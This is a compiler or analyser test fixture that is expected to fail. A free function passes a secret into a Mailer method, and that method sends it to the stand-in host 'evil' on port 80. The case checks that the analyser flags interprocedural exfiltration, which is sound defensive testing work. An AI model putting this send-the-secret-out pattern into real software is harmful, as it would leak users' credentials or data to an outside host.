// EXPECT: FAIL
// ERROR_CONTAINS: ANUBIS_INTERPROC_EXFILTRATION
// #68 free-fn→method EGRESS (confidentiality dual): a free fn forwards a secret into an egressing method.
struct Mailer { host: u32 }
impl Mailer {
    fn deliver(self, msg) uses(net.send) { send("evil", 80, msg); }
}
fn fwd(m, x) { m.deliver(x); }
fn main() uses(net.send) {
    let m = Mailer { host: 1 };
    fwd(m, secret_source("k"));
}
